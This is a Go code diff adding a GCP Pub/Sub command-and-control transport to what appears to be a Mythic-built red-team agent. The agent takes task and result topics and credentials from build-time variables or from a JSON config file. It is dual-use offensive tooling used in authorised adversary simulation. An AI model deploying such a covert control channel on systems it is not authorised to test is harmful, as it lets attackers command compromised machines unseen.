@@ -22,6 +22,7 @@ package main
 
 import (
 	// Standard
+	"encoding/json" // Added for parsing transport_config.json in pubsub case
 	"fmt"
 	"os"
 	"strconv"
@@ -107,6 +108,14 @@ var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KH
 // verbose a boolean value that determines if the Agent will print verbose output
 var verbose = "false"
 
+// PubSub-specific variables (injected at build time by Mythic)
+var gcpProjectID = ""
+var serverToAgentTopic = ""
+var agentToServerTopic = ""
+var serverToAgentSub = ""
+var agentToServerSub = ""
+var credentialsJSON = ""
+
 func main() {
 	core.Verbose, _ = strconv.ParseBool(verbose)
 	core.Debug, _ = strconv.ParseBool(debug)
@@ -178,6 +187,59 @@ func main() {
 				color.Red(err.Error())
 			}
 			os.Exit(1)
+		}
+	case "pubsub":
+		// GCP Pub/Sub C2 profile client configuration
+		var pubsubConfig Config
+
+		// Check if build-time variables are set (Mythic build) or use config file (standalone build)
+		if gcpProjectID != "" && serverToAgentTopic != "" && agentToServerTopic != "" {
+			// Build-time variables injected by Mythic - use them
+			pubsubConfig = Config{
+				ProjectID:       gcpProjectID,
+				TasksTopic:      serverToAgentTopic,      // Server publishes tasks here
+				ResultsTopic:    agentToServerTopic,       // Agent publishes results here
+				SubscriptionID:  serverToAgentSub,         // Agent subscribes to tasks
+				CredentialsJSON: credentialsJSON,
+			}
+			if core.Verbose {
+				color.Cyan("[*] Using build-time configuration (Mythic build)")
+			}
+		} else {
+			// No build-time variables - load config from transport_config.json (standalone mode)
+			var configData []byte
+			configData, err = os.ReadFile("transport_config.json")
+			if err != nil {
+				if core.Verbose {
+					color.Red(fmt.Sprintf("failed to read transport_config.json: %s", err.Error()))
+				}
+				os.Exit(1)
+			}
+
+			// Parse the JSON config into Config struct
+			err = json.Unmarshal(configData, &pubsubConfig)
+			if err != nil {
+				if core.Verbose {
+					color.Red(fmt.Sprintf("failed to parse transport_config.json: %s", err.Error()))
+				}
+				os.Exit(1)
+			}
+			if core.Verbose {
+				color.Cyan("[*] Using config file (standalone build)")
+			}
+		}
+
+		// Create pubsub client using the config and agent ID
+		client, err = NewPubSubClient(&pubsubConfig, a.ID().String())
+		if err != nil {
+			if core.Verbose {
+				color.Red(fmt.Sprintf("failed to create pubsub client: %s", err.Error()))
+			}
+			os.Exit(1)
+		}
+
+		if core.Verbose {
+			color.Green("[+] PubSub client initialized successfully")
 		}
 	default:
 		if core.Verbose {
